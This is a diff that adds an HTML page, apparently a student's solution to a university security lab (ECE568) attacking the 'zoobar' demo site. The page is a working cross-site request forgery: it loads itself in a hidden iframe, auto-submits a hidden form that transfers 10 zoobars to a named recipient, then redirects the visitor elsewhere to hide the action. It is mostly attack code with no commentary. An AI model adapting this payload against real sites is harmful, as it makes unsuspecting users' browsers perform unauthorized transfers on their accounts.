@@ -1,0 +1,55 @@
+<html>
+	<head>
+		<script type="text/javascript">			
+			function post(path, params, method) {
+				method = method || "post"; // Set method to post by default if not specified.
+			
+				// The rest of this code assumes you are not using a library.
+				// It can be made less wordy if you use one.
+				var form = document.createElement("form");										
+				form.setAttribute("method", method);
+				form.setAttribute("action", path);
+			
+				for(var key in params) {
+					if(params.hasOwnProperty(key)) {
+						var hiddenField = document.createElement("input");
+						hiddenField.setAttribute("type", "hidden");
+						hiddenField.setAttribute("name", key);
+						hiddenField.setAttribute("value", params[key]);
+			
+						form.appendChild(hiddenField);
+					}
+				}				
+				document.body.appendChild(form);
+				form.submit();			
+			}
+			var i = 0;
+			function initOnLoad(){
+				if(window.location.search == "?kill=1")
+				{
+					post('http://zoobar.csl.toronto.edu/transfer.php', {zoobars: 10, zb_recipient:"g2minhle2" , submission:"Send"});	
+				} else {																	
+					var mainInterval = setInterval(function(){												
+						try{
+							console.log("checking url");							
+							var url = document.getElementById("myFrame").contentWindow.url;
+							console.log("checking passed");
+							if(url == "http://zoobar.csl.toronto.edu/transfer.php"){
+								window.location = "http://ece568.csl.toronto.edu/";
+								clearInterval(mainInterval);	
+							}
+						} catch (e){
+							console.log("checking failed");
+							window.location = "http://ece568.csl.toronto.edu/";
+							clearInterval(mainInterval);
+						}						 
+					}, 100);					
+					document.getElementById("myFrame").src="./partB.html?kill=1";																		
+				}
+			}			
+		</script>	
+	</head>
+	<body onload="initOnLoad()">
+		<iframe id="myFrame" hidden="true"></iframe>
+	</body>
+</html>
